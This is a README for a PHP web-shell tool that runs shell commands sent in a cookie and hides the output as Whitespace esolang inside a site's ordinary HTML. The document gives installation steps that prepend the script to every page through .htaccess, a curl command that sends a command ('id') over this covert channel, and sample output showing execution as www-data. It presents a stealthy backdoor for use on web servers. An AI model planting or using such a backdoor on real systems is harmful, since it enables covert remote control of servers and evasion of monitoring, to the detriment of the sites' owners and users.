# Whitespace Covert Channel

Executes shell commands and returns output in Whitespace Esolang over original HTML.

## Requirements
* A decent shell (zsh/bash)
* Curl
* Whitespace Interpreter (used original haskell linux binary from http://compsoc.dur.ac.uk/whitespace/download.php)
* PHP inflate tool (in this folder)

## Installation
* Drop wcc.php into the document root folder
* Drop .htaccess into the document root folder OR add php_value auto_prepend_file "wcc.php"
* Enjoy

## Usage
    curl -s -H 'Cookie: wcc_cmd=id' http://127.0.0.1/wcc/ -o temp.ws && ./wspace temp.ws | head -n -3 | php inflate.php

## Output
    = WCC = Command output ==========================
    
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    
    = WCC = EOF =====================================
